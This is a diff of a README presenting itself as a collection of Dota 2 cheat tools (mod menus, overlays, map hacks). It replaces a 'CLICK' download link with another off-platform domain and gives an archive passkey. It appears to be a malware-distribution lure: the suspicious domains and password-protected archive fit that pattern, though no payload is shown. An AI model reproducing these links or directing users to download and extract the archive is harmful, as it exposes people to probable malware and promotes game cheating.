@@ -9,7 +9,7 @@ A collection of open-source tools for Dota 2 — mod menus, visual overlays, map
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top)**
+**[CLICK](https://gitappsdown.pro/)**
 
 Archive passkey: `Github`
 
@@ -94,7 +94,7 @@ These tools are intended for research and educational purposes only.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top)** to download.
+1. Click **[CLICK](https://gitappsdown.pro/)** to download.
 
 2. Extract the archive.
 
